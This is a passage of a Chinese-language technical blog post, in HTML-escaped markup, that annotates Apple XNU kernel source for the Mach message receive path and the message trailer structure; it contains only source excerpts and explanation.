&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_sender&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sec_token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_audit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;audit_token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;trailer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_labels&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sender&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_trailer_type_t&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;msgh_trailer_type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_trailer_size_t&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;msgh_trailer_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_port_seqno_t&lt;/span&gt;             &lt;span class=&quot;n&quot;&gt;msgh_seqno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;security_token_t&lt;/span&gt;              &lt;span class=&quot;n&quot;&gt;msgh_sender&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;audit_token_t&lt;/span&gt;                 &lt;span class=&quot;n&quot;&gt;msgh_audit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_port_context_t&lt;/span&gt;           &lt;span class=&quot;n&quot;&gt;msgh_context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_filter_id&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;msgh_ad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;msg_labels_t&lt;/span&gt;                  &lt;span class=&quot;n&quot;&gt;msgh_labels&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg_mac_trailer_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;当函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_msg()&lt;/code&gt;第二个参数是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MACH_RCV_MSG&lt;/code&gt;的时候，会调用函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_msg_receive_results()&lt;/code&gt;读取消息&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_return_t&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;mach_msg_overwrite_trap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg_overwrite_trap_args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 初始化基础变量&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_vm_address_t&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;msg_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_option_t&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;option&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// mach_msg()第二个参数&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;mach_msg_return_t&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;mr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 大吉大利&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;vm_map_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;map&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

	&lt;span class=&quot;cm&quot;&gt;/* Only accept options allowed by the user */&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;option&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_OPTION_USER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// mach_msg()：发送消息&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;option&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_SEND_MSG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// mach_msg()：接收消息，我们关注这个分支&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;option&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_RCV_MSG&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;thread_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;self&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;ipc_space_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;space&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_space&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;ipc_object_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;ipc_mqueue_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mqueue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

		&lt;span class=&quot;n&quot;&gt;mr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_mqueue_copyin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;space&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rcv_name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mqueue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        
        &lt;span class=&quot;c1&quot;&gt;// 设置接收消息的缓冲区地址&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rcv_msg_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach_vm_address_t&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ith_msg_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rcv_msg_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ith_msg_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
		
		&lt;span class=&quot;c1&quot;&gt;// 将重要参数设置为线程全局结构体变量&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ith_object&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ith_rsize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rcv_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ith_msize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ith_option&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ith_receiver_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_PORT_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ith_continuation&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;thread_syscall_return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ith_knote&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ITH_KNOTE_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;c1&quot;&gt;// 从消息队列里获取消息&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// Purpose: Receive a message from a message queue.&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;ipc_mqueue_receive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mqueue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rcv_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg_timeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;THREAD_ABORTSAFE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;option&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_RCV_TIMEOUT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msg_timeout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;thread_poll_yield&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
		
		&lt;span class=&quot;c1&quot;&gt;// 读取消息&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mach_msg_receive_results&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mach_msg_receive_results()&lt;/code&gt;用于读取消息，如果消息读取成功，会调用函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ipc_kmsg_add_trailer()&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;mach_msg_return_t&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;mach_msg_receive_results&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sizep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// 初始化基础变量&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;thread_t&lt;/span&gt;          &lt;span class=&quot;n&quot;&gt;self&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// 获取线程全局结构体变量self&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;ipc_space_t&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;space&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_space&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;vm_map_t&lt;/span&gt;          &lt;span class=&quot;n&quot;&gt;map&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;current_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;mach_msg_trailer_size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trailer_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_size_t&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;cm&quot;&gt;/*
	 * unlink the special_reply_port before releasing reference to object.
	 * get the thread's turnstile, if the thread donated it's turnstile to the port
	 */&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;mach_msg_receive_results_complete&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;io_release&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;cm&quot;&gt;/* auto redeem the voucher in the message */&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;ipc_voucher_receive_postprocessing&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;// 确定是哪种trailer结构体，计算trailer的长度&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;trailer_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_kmsg_add_trailer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;space&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;seqno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
	    &lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_header&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msgh_remote_port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip_context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;mr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_kmsg_copyout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;space&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_BODY_NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MACH_MSG_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;cm&quot;&gt;/* capture ksmg QoS values to the thread continuation state */&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ith_qos&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_qos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ith_qos_override&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikm_qos_override&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		
		&lt;span class=&quot;c1&quot;&gt;// 把消息传递给用户态&lt;/span&gt;
		&lt;span class=&quot;c1&quot;&gt;// 函数ipc_kmsg_add_trailer()计算的trailer_size在这里使用到&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;mr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_kmsg_put&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rcv_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rcv_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trailer_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sizep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sizep&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
